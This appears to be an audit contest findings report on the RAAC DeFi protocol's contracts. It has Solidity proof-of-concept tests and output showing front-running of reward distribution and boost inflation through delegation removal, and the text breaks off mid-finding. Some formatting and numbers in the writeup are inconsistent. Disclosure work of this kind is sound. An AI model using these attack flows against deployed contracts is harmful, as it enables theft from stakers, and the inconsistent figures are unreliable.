# RAAC Contest
RAAC Protocol contest || Core Contracts: Regnum Aurum Acquisition Corp ||  Feb 3rd, 2025 → Feb 24th, 2025 on [Codehawks](https://codehawks.cyfrin.io/?contestType=all&ended=true&judging=true&live=true&sort=state&upcoming=true)

My Finding Summay
|ID|Title|Severity|
|:-:|:---|:------:|
|[H-01](#h-01-Protocol-lacks-of-Fee-Collection-Implementation-Leads-to-Potential-Revenue-Loss-throughout-all-contracts-inscope)|Protocol lacks of Fee Collection Implementation Leads to Potential Revenue Loss throughout all contracts inscope |HIGH|
||||
|[H-02](#h-02-distributeRevenue()-function-front-running-attack-enables-attackers-to-gain-disappropriate-equal-rewards-as-normal-users-with-1/10th-Stake)|`distributeRevenue()` function front-running attack enables attackers to gain disappropriate equal rewards as normal users with `1/10th Stake`.|HIGH|
|[H-03](#h-03-Permanent-boost-inflation-through-delegation-removal-in-Boostcontroller.sol)| Permanent boost inflation through delegation removal in `Boostcontroller.sol`.|HIGH|
|[H-04](#h-04-Attackers-would-manipulate-votes-through-lock-duration-extension-in-`Goverance.sol`-increasing-their-voting-power)|Attackers would manipulate votes through lock duration extension in `Goverance.sol` increasing their voting power. |HIGH|
|[H-05](#h-05-Reward-Distribution-can-be-manipulated-in-`BaseGauge.sol`-due-to-`_getBaseWeight()`-function-returning-the-same-global-gauge-weight-for-all-users.)|Reward Distribution can be manipulated in `BaseGauge.sol` due to `_getBaseWeight()` function returning the same global gauge weight for all users.|HIGH|
|[H-06](#h-06-Voting-power-would-be-manipulated-by-extending-proposals)| Voting power would be manipulated by extending proposals|HIGH|
||||
|[M-01](#m-01-An-Attacker-can-manipulate-Quorum-in-Governace.sol-to-force-legitimate-user-proposal-to-be-defeated-while-making-theirs-succeed.)|An Attacker can manipulate Quorum in `Governace.sol` to force legitimate user proposal to be defeated while making theirs succeed.|MEDIUM|
|[M-02](#m-02-hardcoded-baseamount-in-Updateuserboost-fucntion-causes-users-with-small-token-holdings-to-receive-higher-boosts-relative-to-their-holdings)|hardcoded baseamount in `Updateuserboost` fucntion causes users with small token holdings to receive higher boosts relative to their holdings.|MEDIUM|
|[M-03](#m-03-Replay-Attack-vul-in-Goverance.sol)|Replay Attack vul in `Goverance.sol`|MEDIUM|
|[M-04](#m-04-Cordinated-group-of-attacker-can-artificially-lower-quorum-threshold-during-active-proposals-forcing-malicious-proposals-to-pass-without-true-majority-support)| Cordinated group of attacker can artificially lower quorum threshold during active proposals forcing malicious proposals to pass without true majority support |MEDIUM|
|[M-05](#m-05-Attackers-can-front-run-calls-to-setTypeWeight-to-gain-extra-voting-power)|Attackers can front-run calls to `setTypeWeight` to gain extra voting power|MEDIUM|
||||
|[M-06](#m-06-Workingsupply-would-always-be-overwritten-in-boostcontroller.sol-impacting-reward-calculations)|Workingsupply would always be overwritten in `boostcontroller.sol` impacting reward calculations.|MEDIUM|
|[M-07](#m-07-Lack-of-staleness-price-check-in-RAACHousePrices.sol)|Lack of staleness price check in `RAACHousePrices.sol`.|MEDIUM|
|[M-08](#m-08-Lack-of-stale-price-check-can-lead-to-bad-debt-in-Lendingpool.sol)|Lack of stale price check can lead to bad debt in `Lendingpool.sol`|LOW|
|[L-01](#l-01-Invariant-broken-in-`getBoostMultiplier.sol`-in-the-BoostController-contract.)|Invariant broken in `getBoostMultiplier.sol` in the BoostController contract.|LOW|
|[L-02](#l-02-Delegated-boosts-remain-active-after-the-underlying-veToken-lock-expires-&-obtain-boosts-in-BoostController.sol)|Delegated boosts remain active after the underlying veToken lock expires & obtain boosts in BoostController.sol |LOW|
|[L-03](#l-03-Canceled-vote-still-get-voted-on-and-accumulate-voting-power-in-Goverance.sol)|Canceled vote still get voted on and accumulate voting power in `Goverance.sol`|LOW|

----


## [H-01] Protocol lacks of Fee Collection Implementation Leads to Potential Revenue Loss throughout all contracts inscope
### Description

RAAC protocol has implemented a fee collection logic mechanicsm in the `FeeCollector.sol` that is meant to handle 8 different types of fees (0-7) including protocol fees, lending fees, performance fees, etc. However, review of all core contracts reveals that none of them integrate with or call the collectFee() function, effectively rendering the fee collection system non-functional and keeping the protocol at a loss.

### Root Cause
The `collectFee()` function in FeeCollector.sol is supposed to handle fee collection but lacks proper integration across the protocol's core contracts. While the function exists and has fee type definitions, no other contract actually implements or calls this function, resulting in a critical gap in the protocol's fee collection mechanism.

### Vulnerability Details
The `collectFee()` function is defined in FeeCollector.sol:

```solidity 
function collectFee(uint256 amount, uint8 feeType) external override nonReentrant whenNotPaused returns (bool) {
    if (amount == 0 || amount > MAX_FEE_AMOUNT) revert InvalidFeeAmount();
    if (feeType > 7) revert InvalidFeeType();
    
    // Transfer tokens from sender
    raacToken.safeTransferFrom(msg.sender, address(this), amount);
    
    // Update collected fees
    _updateCollectedFees(amount, feeType); 
    
    emit FeeCollected(feeType, amount);
    return true;
}
```

### Key findings:

1. The function defines 8 fee types (0-7):

Protocol Fees (0)

Lending Fees (1)

Performance Fees (2)

Insurance Fees (3)

Mint/Redeem Fees (4)

Vault Fees (5)

Swap Tax (6)

NFT Royalties (7)

2. Analysis of related contracts shows:

`LendingPool.sol:` Has lending operations but no fee collection integration: https://github.com/Cyfrin/2025-02-raac/blob/main/contracts/core/pools/LendingPool/LendingPool.sol

`GaugeController.sol`: Handles performance but doesn't collect performance fees:

`RAACMinter.sol`: Manages minting without mint fee collection

`StabilityPool.sol`: No protocol fee collection implementation

The fee distribution system in FeeCollector includes complex logic for sharing between:

veRAACToken holders

Token burns

Repair fund

Treasury

However, this entire system remains unused due to lack of integration.

### Impact
1. Financial Impact:

Loss of protocol revenue from uncollected fees

Missing incentives for veRAACToken holders

Reduced protocol sustainability without fee income

### Tools Used
### Recommendations
Integrate necessary inplementations to the right contracts.

## [H-02] `distributeRevenue()` function front-running attack enables attackers to gain disappropriate equal rewards as normal users with `1/10th Stake`
### Description

A critical vulnerability exist in RAAC Protocol's gauge reward distribution system, specifically in the BaseGauge.sol and GaugeController.sol contract. The vulnerability allows attackers to exploit the reward distribution mechanism through front-running attacks, enabling them to capture disproportionate rewards at the expense of legitimate long-term stakers.

This attack leverages the lack of time-weighted staking mechanisms and proper reward distribution safeguards. An attacker would monitor pending reward distributions and strategically time their stakes to maximize reward capture, effectively stealing rewards from users who have staked larger amounts for longer periods.

### Affected Functions in BaseGauge.sol:

* getRewardPerToken() https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/gauges/BaseGauge.sol#L568 - Vulnerable to manipulation of reward rate calculations

* earned(address account) https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/gauges/BaseGauge.sol#L583 - would be exploited due to immediate reward eligibility

* stake(uint256 amount) https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/gauges/BaseGauge.sol#L261 - No time-weighted mechanism or minimum stake period

* getReward() https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/gauges/BaseGauge.sol#L327 - Allows immediate reward claims without vesting

* _updateReward(address account) https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/gauges/BaseGauge.sol#L167- Updates rewards without considering stake duration

### Affected Functions in GaugeController.sol:``https://github.com/Cyfrin/2025-02-raac/blob/main/contracts/core/governance/gauges/GaugeController.sol

* distributeRevenue(GaugeType gaugeType, uint256 amount) https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/gauges/GaugeController.sol#L511- would be front-run

* _distributeToGauges(GaugeType gaugeType, uint256 amount https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/gauges/GaugeController.sol#L534 - Predictable distribution mechanism

* _calculateReward(address gauge) https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/gauges/GaugeController.sol#L360 - Linear reward calculation without time-weighting

The flaw allows attackers to exploit these functions by monitoring pending reward distributions and strategically timing their stakes to maximize reward capture. This is possible because:

The reward calculation mechanism in getRewardPerToken( uses current total supply without time-weighting

New stakes in stake() become immediately eligible for rewards.

The distributeRevenue() function's execution is predictable and can be front-run

getReward() allows immediate claiming without any vesting period.

This is particularly severe because:

It undermines the core staking incentive mechanism

Allows for systematic exploitation with minimal capital requirement

Disproportionately impacts long-term stakers who are crucial for protocol stability

Creates a negative feedback loop that could lead to mass withdrawals

### Vulnerability Details
Bug Flow:
It stems from several interconnected issues in the reward distribution architecture:

Reward Rate Calculation Flaw: In Baseguage.sol

```solidity
// BaseGauge.sol
function getRewardPerToken() public view returns (uint256) {
    if (totalSupply() == 0) {      
        return rewardPerTokenStored;
    }
    return rewardPerTokenStored + (
        (lastTimeRewardApplicable() - lastUpdateTime) * rewardRate * 1e18 / totalSupply()
    );
}
```

This calculation uses the current totalSupply() without considering stake duration, making it vulnerable to manipulation through quick deposits and withdrawals.

2.Immediate Reward Eligibility: In the earned function: https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/gauges/BaseGauge.sol#L583

```solidity
function earned(address account) public view returns (uint256) {
    return (getUserWeight(account) * 
        (getRewardPerToken() - userStates[account].rewardPerTokenPaid) / 1e18
    ) + userStates[account].rewards;
}
New stakes immediately become eligible for rewards without any vesting or time-lock period.

In GuageController.sol:

// GaugeController.sol
function _distributeToGauges(GaugeType gaugeType, uint256 amount) internal {
    // ... weight calculations ...
    for (uint256 i = 0; i < _gaugeList.length; i++) {
        address gauge = _gaugeList[i];
        if (gauges[gauge].isActive && gauges[gauge].gaugeType == gaugeType) {
            uint256 gaugeShare = (amount * gaugeWeights[i]) / totalTypeWeight;
            if (gaugeShare > 0) {
                IGauge(gauge).notifyRewardAmount(gaugeShare);
            }
        }
    }
}
```

The distribution mechanism is predictable and would be front-run.

### Proof of Code: Add this code in a testfile and run it.

```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import "forge-std/Test.sol";  // This already includes vm
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
​
// Local imports
import "../../../../../contracts/core/governance/gauges/BaseGauge.sol";
import "../../../../../contracts/interfaces/core/governance/gauges/IGaugeController.sol";
import "../../../../../contracts/interfaces/core/governance/gauges/IGauge.sol";
import "../../../../../contracts/core/tokens/veRAACToken.sol";
import "../../../../../contracts/core/governance/gauges/GaugeController.sol";
​
​
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
} 
​
// Test implementation of BaseGauge
contract TestGauge is BaseGauge {
    constructor(
        address _rewardToken,
        address _stakingToken, 
        address _controller,
        uint256 _maxEmission,
        uint256 _periodDuration
    ) BaseGauge(_rewardToken, _stakingToken, _controller, _maxEmission, _periodDuration) {
        // Initialize boost parameters
        boostState.maxBoost = 25000; // 2.5x
        boostState.minBoost = 10000; // 1.0x
        boostState.boostWindow = 7 days;
    }
​
    function _getBaseWeight(address account) internal view override returns (uint256) {
        return IGaugeController(controller).getGaugeWeight(address(this));
    }
​
    // Add this helper function to expose internal _getBaseWeight
    function getBaseWeight(address account) external view returns (uint256) {
        return _getBaseWeight(account);
    }
} 
​
contract BaseGaugePOC is Test {
    TestGauge public gauge;
    MockERC20 public rewardToken;
    MockERC20 public stakingToken;
    GaugeController public controller;
    veRAACToken public veToken;
​
    function setUp() public {
        // Deploy tokens
        rewardToken = new MockERC20("Reward", "RWD");
        stakingToken = new MockERC20("Stake", "STK"); 
        
        // Deploy veToken
        veToken = new veRAACToken(address(stakingToken));
        
        // Setup initial veToken state
        deal(address(stakingToken), address(this), 1000e18);
        stakingToken.approve(address(veToken), 1000e18);
        veToken.lock(1000e18, 365 days);
        
        // Deploy controller
        controller = new GaugeController(address(veToken));
        
        // Setup controller roles
        bytes32 GAUGE_ADMIN = controller.GAUGE_ADMIN();
        bytes32 DEFAULT_ADMIN_ROLE = controller.DEFAULT_ADMIN_ROLE();
        controller.grantRole(DEFAULT_ADMIN_ROLE, address(this));
        controller.grantRole(GAUGE_ADMIN, address(this));
        
        // Deploy gauge
        gauge = new TestGauge(
            address(rewardToken),
            address(stakingToken),
            address(controller),
            10_000e18,  // Increased maxEmission
            7 days   // periodDuration
        );
        
        // Add gauge to controller
        controller.addGauge(
            address(gauge),
            IGaugeController.GaugeType.RAAC,
            10e18  // initial weight
        );
    }
​
     function testFrontRunningRewardDistributionAttack() public {
        // SETUP PHASE
        address legitimateUser = address(0x1);
        address attacker = address(0x2);
        
        emit log_string("\n=== Initial Setup ===");
        
        // Setup gauge weight
        deal(address(veToken), address(this), 1000e18);
        vm.startPrank(address(this));
        GaugeController(controller).vote(address(gauge), 10000);
        vm.stopPrank();
​
        // Deal tokens to users FIRST
        deal(address(stakingToken), legitimateUser, 1000e18);
        deal(address(stakingToken), attacker, 100e18);
        deal(address(rewardToken), address(gauge), 10000e18);
​
        // LEGITIMATE USER STAKES FIRST
        emit log_string("\n=== Legitimate User Stakes ===");
        vm.startPrank(legitimateUser);
        stakingToken.approve(address(gauge), 1000e18);
        gauge.stake(1000e18);
        vm.stopPrank();
​
        vm.warp(block.timestamp + 5 days);
​
        // ATTACK EXECUTION
        emit log_string("\n=== Attack Execution ===");
        
        // 1. Attacker front-runs with smaller stake
        vm.startPrank(attacker);
        stakingToken.approve(address(gauge), 100e18);
        emit log_string("Attacker Staking Flow:");
        gauge.stake(100e18);
        emit log_named_uint("Attacker Stake Amount", gauge.balanceOf(attacker));
        vm.stopPrank();
​
        // 2. Reward distribution happens
        vm.startPrank(address(this));
        emit log_string("\nReward Distribution Flow:");
        GaugeController(controller).distributeRevenue(
            IGaugeController.GaugeType.RAAC,
            10000e18
        );
        vm.stopPrank();
        
        // Let rewards accrue for 1 hour
        vm.warp(block.timestamp + 1 hours);
        
        // REWARD CLAIMS
        emit log_string("\n=== Reward Claims ===");
        
        // Trace attacker's reward claim
        emit log_string("\nAttacker Reward Claim Flow:");
        vm.startPrank(attacker);
        emit log_string("\nAttacker getReward Flow:");
        emit log_named_uint("Pre-claim rewardPerTokenStored", gauge.rewardPerTokenStored());
        emit log_named_uint("Pre-claim earned", gauge.earned(attacker));
        emit log_named_uint("Pre-claim balance", rewardToken.balanceOf(attacker));
​
        gauge.getReward();  // Triggers: updateReward -> _updateReward -> earned -> transfer
​
        emit log_named_uint("Post-claim rewardPerTokenStored", gauge.rewardPerTokenStored());
        emit log_named_uint("Post-claim earned", gauge.earned(attacker));
        emit log_named_uint("Post-claim balance", rewardToken.balanceOf(attacker));
        vm.stopPrank();
        
        // Trace legitimate user's reward claim
        emit log_string("\nLegitimate User Reward Claim Flow:");
        vm.startPrank(legitimateUser);
        emit log_string("\nLegitimate User getReward Flow:");
        emit log_named_uint("Pre-claim rewardPerTokenStored", gauge.rewardPerTokenStored());
        emit log_named_uint("Pre-claim earned", gauge.earned(legitimateUser));
        emit log_named_uint("Pre-claim balance", rewardToken.balanceOf(legitimateUser));
​
        gauge.getReward();  // Triggers: updateReward -> _updateReward -> earned -> transfer
​
        emit log_named_uint("Post-claim rewardPerTokenStored", gauge.rewardPerTokenStored());
        emit log_named_uint("Post-claim earned", gauge.earned(legitimateUser));
        emit log_named_uint("Post-claim balance", rewardToken.balanceOf(legitimateUser));
        vm.stopPrank();
        
        // ANALYSIS
        emit log_string("\n=== Analysis ===");
        emit log_named_uint("Stake Ratio (Legitimate:Attacker)", 1000e18 / 100e18);
        emit log_named_uint("Reward Ratio (Attacker:Legitimate)", 
            rewardToken.balanceOf(attacker) * 100 / rewardToken.balanceOf(legitimateUser));
        
        assertTrue(
            rewardToken.balanceOf(attacker) > rewardToken.balanceOf(legitimateUser) / 2,
            "Attacker with 1/10th stake shouldn't get more than half of legitimate user's rewards"
        );
​
        emit log_string("\n=== Function Call Flow Analysis ===");
        emit log_string("\n1. Legitimate User Stake Flow:");
        vm.startPrank(legitimateUser);
        emit log_named_uint("rewardPerTokenStored", gauge.rewardPerTokenStored());
        emit log_named_uint("lastUpdateTime", gauge.lastUpdateTime());
        vm.stopPrank();
    } 
}
```
    
OUTPUT:-

```solidity 
=== Initial Setup ===
​
=== Legitimate User Stakes ===
// Legitimate user stakes 1000e18 tokens
​
=== Attack Execution ===
Attacker Staking Flow:
Attacker Stake Amount: 100000000000000000000  // 100e18 tokens (10% of legitimate stake)
​
Reward Distribution Flow:
​
=== Reward Claims ===
​
Attacker Reward Claim Flow:
Attacker getReward Flow:
Pre-claim rewardPerTokenStored: 0
Pre-claim earned: 437229
Pre-claim balance: 0
Post-claim rewardPerTokenStored: 43290043290043288
Post-claim earned: 0
Post-claim balance: 437229  // Attacker's final reward
​
Legitimate User Reward Claim Flow:
Legitimate User getReward Flow:
Pre-claim rewardPerTokenStored: 43290043290043288
Pre-claim earned: 437229
Pre-claim balance: 0
Post-claim rewardPerTokenStored: 43290043290043288
Post-claim earned: 0
Post-claim balance: 437229  // Legitimate user's final reward
​
=== Analysis ===
Stake Ratio (Legitimate:Attacker): 10    // Legitimate user has 10x more stake
Reward Ratio (Attacker:Legitimate): 100  // But attacker gets equal rewards!
​
=== Function Call Flow Analysis ===
1. Legitimate User Stake Flow:
rewardPerTokenStored: 43290043290043288
lastUpdateTime: 435601
The test results demonstrate several critical issues:

Disproportionate Reward Distribution:

Legitimate user staked 1000e18 tokens

Attacker staked only 100e18 tokens (10% of legitimate stake)

Yet both received exactly 437,229 reward tokens

Reward Calculation Manipulation:

Initial rewardPerTokenStored: 0

Post-attack rewardPerTokenStored: 43290043290043288

The attacker's front-running caused equal reward distribution despite unequal stakes

Stake Ratio: 10:1 (Legitimate:Attacker)

Reward Ratio: 1:1 (Legitimate:Attacker)

This represents a 10x efficiency in reward extraction for the attacker

Attack Efficiency:

The attacker achieved equal rewards with only 10% of the capital commitment

The attack was executed within a single transaction

The timing of the attack (front-running the reward distribution) was crucial for its success
```

### Detailed Attack Flow
Based on the POC, here's the step-by-step attack execution:


```solidity 
// Setup gauge weight
deal(address(veToken), address(this), 1000e18);
vm.startPrank(address(this));
GaugeController(controller).vote(address(gauge), 10000);
vm.stopPrank();
​
// Legitimate user stakes large amount
vm.startPrank(legitimateUser);
stakingToken.approve(address(gauge), 1000e18);
gauge.stake(1000e18);  // Stakes 1000 tokens
vm.stopPrank();
Waiting Period

vm.warp(block.timestamp + 5 days);
The attacker monitors the blockchain for pending reward distributions.
```

3. Front-Running Attack Execution

```solidity 
// Attacker front-runs with smaller stake
vm.startPrank(attacker);
stakingToken.approve(address(gauge), 100e18);
gauge.stake(100e18);  // Only stakes 100 tokens
vm.stopPrank();
​
// Reward distribution happens immediately after
vm.startPrank(address(this));
GaugeController(controller).distributeRevenue(
    IGaugeController.GaugeType.RAAC,
    10000e18
);
vm.stopPrank();
Reward Accrual Period:

vm.warp(block.timestamp + 1 hours);
Reward Claims & Analysis.

// Attacker claims first
vm.startPrank(attacker);
gauge.getReward();
vm.stopPrank();
​
// Legitimate user claims
vm.startPrank(legitimateUser);
gauge.getReward();
vm.stopPrank();
```

This POC demonstrates that despite having only 10% of the total stake, the attacker receives more than 50% of the rewards:

```solidity
assertTrue(
    rewardToken.balanceOf(attacker) > rewardToken.balanceOf(legitimateUser) / 2,
    "Attacker with 1/10th stake shouldn't get more than half of legitimate user's rewards"
);
```

### Root Cause Analysis
The vulnerability exists due to several architectural decisions:

Linear Reward Distribution: Rewards are distributed linearly based on current stakes rather than time-weighted stakes.

No Minimum Staking Period: Users can stake and immediately become eligible for rewards.

Predictable Distribution: The reward distribution mechanism is deterministic and can be predicted.

No Anti-Front-Running Measures: Lack of mechanisms to prevent quick stake-and-withdraw behavior.

Immediate Reward Eligibility: New stakes immediately participate in reward distribution without any warm-up period.

### Impact
The impact of this vulnerability is severe and multi-faceted:

Economic Impact

Direct theft of rewards from legitimate stakers

Devaluation of long-term staking positions

Potential for repeated exploitation leading to significant losses

2. Protocol Stability

Discourages long-term staking

Creates incentives for manipulative behavior

Undermines the protocol's tokenomics model

----

### [H-03] Permanent boost inflation through delegation removal in `Boostcontroller.sol`
### Description

A vulnerability exists in the removeBoostDelegation function of the BoostController contract, where the poolBoost.workingSupply is not properly checked when reducing delegation amounts. When the workingSupply is lower than the delegation amount being removed, the function fails to account for this state, leading to an inflated boost in the pool. This allows an attacker to repeatedly delegate and remove boosts, artificially increasing the total boost of the pool. This manipulation results in improper reward distribution, leading to unfair advantages and economic imbalances.

### Vulnerability Details
Affected function: https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/boost/BoostController.sol#L242
```solidity 
function removeBoostDelegation(address from) external {
    UserBoost storage delegation = userBoosts[from][msg.sender];
    
    // Vulnerable conditional checks - doesnt check when the totalBoost < delegation.amount
    if (poolBoost.totalBoost >= delegation.amount) {
        poolBoost.totalBoost -= delegation.amount;
    }
    if (poolBoost.workingSupply >= delegation.amount) {
        poolBoost.workingSupply -= delegation.amount;
    }
    
    // Delegation gets deleted regardless of subtraction success
    delete userBoosts[from][msg.sender];
}
``` 

If the `(poolBoost.totalBoost < delegation.amount)`, there is a problem in accounting. How can this state be reached?

This is how it occurs:

### Delegation Creation:

A user delegates their veRAAC tokens to another recipient (receiver).

This increases the totalBoost and workingSupply of the pool.

Pool Boost Updates:

The receiver updates their boost in the pool, locking in the delegated boost values.

New User Joins the Pool:

A legitimate user deposits their veRAAC tokens and updates their boost.

Rewards are calculated based on the current totalBoost.

Delegation Expires & Removal Begins:

The delegation expiry time passes.

The recipient calls removeBoostDelegation.

The function reduces totalBoost and workingSupply, but only when values are greater than the delegation amount.

when `workingSupply < delegation.amount`, it does not properly handle the state, leaving totalBoost inflated.

### Economic Impact on Reward Distribution:

Due to totalBoost remaining artificially high, the reward calculations for legitimate users become skewed.

Users receive fewer rewards than they should, benefiting the attacker.

## Proof of code:

Add this code to your testfile and run:


// SPDX-License-Identifier: MIT
```solidity 
pragma solidity ^0.8.19;
​
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {BoostController} from "../../../../../contracts/core/governance/boost/BoostController.sol";
import {veRAACToken} from "../../../../../contracts/core/tokens/veRAACToken.sol";
import {RAACToken} from "../../../../../contracts/core/tokens/RAACToken.sol";
​
contract BoostControllerDelegationTest is Test {
    BoostController public boostController;
    veRAACToken public veToken;
    RAACToken public raacToken;
    
    address public delegator = address(0x1);
    address public receiver = address(0x2);
    address public pool = address(0x3);
    address public owner = address(this);
​
    function setUp() public {
        // Deploy contracts
        raacToken = new RAACToken(owner, 100, 50);
        veToken = new veRAACToken(address(raacToken));
        boostController = new BoostController(address(veToken));
        
        // Setup permissions
        boostController.modifySupportedPool(pool, true);
        raacToken.setMinter(owner);
        
        // Mint and setup delegator
        raacToken.mint(delegator, 4000e18);
        raacToken.manageWhitelist(delegator, true);
        raacToken.manageWhitelist(address(veToken), true);
        
        // Lock tokens to get veTokens
        vm.startPrank(delegator);
        raacToken.approve(address(veToken), type(uint256).max);
        veToken.lock(4000e18, 365 days);  // To get 1000 veTokens (25% of 4000)
        vm.stopPrank();
    }
​
        function testDelegationRemovalVulnerability() public {
        console.log("\nStep 1: Initial State");
        uint256 veTokenBalance = veToken.balanceOf(delegator);
        console.log("Delegator veToken balance:", veTokenBalance);
​
        // Step 1: Create delegation with full balance
        vm.startPrank(delegator);
        boostController.delegateBoost(receiver, veTokenBalance, 30 days);
        vm.stopPrank();
​
        // Get delegation info
        (uint256 delegationAmount, uint256 expiry,,) = boostController.getUserBoost(delegator, receiver);
        console.log("\nStep 2: Delegation Created");
        console.log("Delegation amount:", delegationAmount);
        console.log("Delegation expiry:", expiry);
​
        // Step 3: Receiver updates boost - this sets pool totals
        vm.prank(receiver);
        boostController.updateUserBoost(receiver, pool);
​
        // Check pool state after boost update
        (uint256 poolTotalBoost, uint256 workingSupply,,) = boostController.getPoolBoost(pool);
        console.log("\nStep 3: Pool State After Boost Update");
        console.log("Pool total boost:", poolTotalBoost);
        console.log("Pool working supply:", workingSupply);
        console.log("Original delegation amount:", delegationAmount);
​
        // Add a legitimate user to show reward impact
        address legitUser = address(0x4);
        raacToken.mint(legitUser, 1000e18);
        raacToken.manageWhitelist(legitUser, true);
        
        vm.startPrank(legitUser);
        raacToken.approve(address(veToken), type(uint256).max);
        veToken.lock(1000e18, 365 days);
        boostController.updateUserBoost(legitUser, pool);
        vm.stopPrank();
​
        (uint256 legitUserBoost,,,) = boostController.getUserBoost(legitUser, pool);
        console.log("\nLegitimate User's Boost:", legitUserBoost);
​
        // Calculate rewards before delegation removal
        uint256 dailyRewards = 1000e18; // 1000 tokens per day
        uint256 legitUserRewardsBefore = (legitUserBoost * dailyRewards) / (poolTotalBoost + legitUserBoost);
        console.log("Legitimate User's Daily Rewards Before:", legitUserRewardsBefore / 1e18);
​
        // Step 4: Move past delegation expiry and remove delegation
        vm.warp(block.timestamp + 31 days);
        vm.prank(receiver);
        boostController.removeBoostDelegation(delegator);
​
        // Get final pool state
        (uint256 postTotalBoost, uint256 postWorkingSupply,,) = boostController.getPoolBoost(pool);
        console.log("\nStep 5: Pool State After Removal");
        console.log("Pool total boost:", postTotalBoost);
        console.log("Pool working supply:", postWorkingSupply);
​
        // Calculate rewards after delegation removal
        // Note: Pool boost remains inflated, affecting reward calculations
        uint256 legitUserRewardsAfter = (legitUserBoost * dailyRewards) / (postTotalBoost + legitUserBoost);
        
        console.log("\nEconomic Impact:");
        console.log("Expected Pool Total Boost: 0");
        console.log("Actual Pool Total Boost:", postTotalBoost);
        console.log("Legitimate User's Daily Rewards Before:", legitUserRewardsBefore / 1e18);
        console.log("Legitimate User's Daily Rewards After:", legitUserRewardsAfter / 1e18);
        console.log("Lost Rewards:", (legitUserRewardsBefore - legitUserRewardsAfter) / 1e18);
        
        // Calculate percentage of rewards lost
        uint256 rewardLossPercent = ((legitUserRewardsBefore - legitUserRewardsAfter) * 100) / legitUserRewardsBefore;
        console.log("Percentage of Rewards Lost:", rewardLossPercent, "%");
​
        // Show how this could be exploited
        console.log("\nExploit Potential:");
        console.log("An attacker could:");
        console.log("1. Create multiple delegations");
        console.log("2. Remove them to inflate pool boost");
        console.log("3. Each removal adds phantom boost of:", poolTotalBoost);
        console.log("4. After 10 removals, phantom boost would be:", poolTotalBoost * 10);
        
        // Verify the vulnerability
        assertGt(
            postTotalBoost,
            0,
            "Pool boost should be 0 but remains inflated"
        );
        
        assertLt(
            legitUserRewardsAfter,
            legitUserRewardsBefore,
            "User receives fewer rewards due to phantom boost"
        );
    }
}
``` 


### Vulnerability flow.

Initial State Creation:


// User locks tokens and creates first delegation
```solidity 
veToken.lock(4000e18, 365 days);
boostController.delegateBoost(receiver, veTokenBalance, 30 days);
​
// Pool State after first delegation:
poolTotalBoost = 10000
workingSupply = 10000
Second Delegation:

// Create second delegation
boostController.delegateBoost(receiver2, 1000e18, 30 days);
​
// Pool State after second delegation:
poolTotalBoost = 20000
workingSupply = 10000
Delegation Removals:

// First removal - changes state
boostController.removeBoostDelegation(delegator);
// Pool state remains unchanged due to vulnerability:
// poolTotalBoost = 20000
// workingSupply = 10000
​
// Second removal - vulnerable state reached!!!
boostController.removeBoostDelegation(delegator);
// poolBoost.totalBoost (20000) < delegation.amount (1000e18)
// Subtraction skipped but delegation deleted
Final Corrupted State:

// Final pool state:
poolTotalBoost = 20000    // Permanent phantom boost
workingSupply = 10000     // Also inflated
```

// Both delegations deleted but pool totals unchanged

### Impact
Economic Impact:
// Example from POC:
Legitimate user boost: 13000
Phantom boost affecting rewards: 20000
Legitimate user daily rewards: 393    // Severely reduced
Rewards lost to phantom boost: 607    // Lost to inflation
Reward Dilution:



Legitimate users receive fewer rewards

Inflated boosts permanently reduce reward share

Each exploitation increases dilution

Compounding Effect:

Multiple removals can stack inflated boosts

Each removal can add to pool inflation

No upper bound on potential inflation

State Corruption:

Pool totals become permanently inflated

No mechanism to correct corrupted state

Affects all future protocol operations


### [H-04] Attackers would manipulate votes through lock duration extension in `Goverance.sol` increasing their voting power
### Description

In the governance.sol system's voting mechanism there is a flaw that allows attackers to manipulate their voting power during active proposal periods. The vulnerability stems from the interaction between the veRAACToken's lock duration extension feature extend function and the Governance.sol contract's voting power calculation timing.

The core issue is that voting power can be significantly amplified during the voting period by extending lock durations. An attacker can initially lock tokens for a minimum duration (365 days), wait to see how a proposal is trending, then extend their lock duration to the maximum (1460 days) just before voting. This creates a timing attack vector where users can strategically multiply their voting power by up to 4x after a proposal is already in progress.

My proof of concept demonstrates how multiple accounts can coordinate to amplify their collective voting power from an initial ~500k votes to over 3.3M votes (a 6x increase) by manipulating lock durations during the voting period. This undermines the democratic nature of the governance system and allows minority token holders to potentially control voting outcomes.

### Vulnerability Details
The vulnerability exists in the interaction between three key functions:

Initial Lock Setup: In veRAACToken.sol contract, the lockfucntion : https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/veRAACToken.sol#L212

```solidity 
// In veRAACToken
function lock(uint256 amount, uint256 duration) external {
    // Initial lock with minimum duration (365 days)
    _votingState.calculateAndUpdatePower(
        msg.sender,
        amount,
        block.timestamp + duration
    );
}
Lock Duration Extension: https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/veRAACToken.sol#L280

// In veRAACToken
function extend(uint256 duration) external {
    // Voting power increases when duration is extended
    _votingState.calculateAndUpdatePower(
        msg.sender,
        _locks[msg.sender].amount,
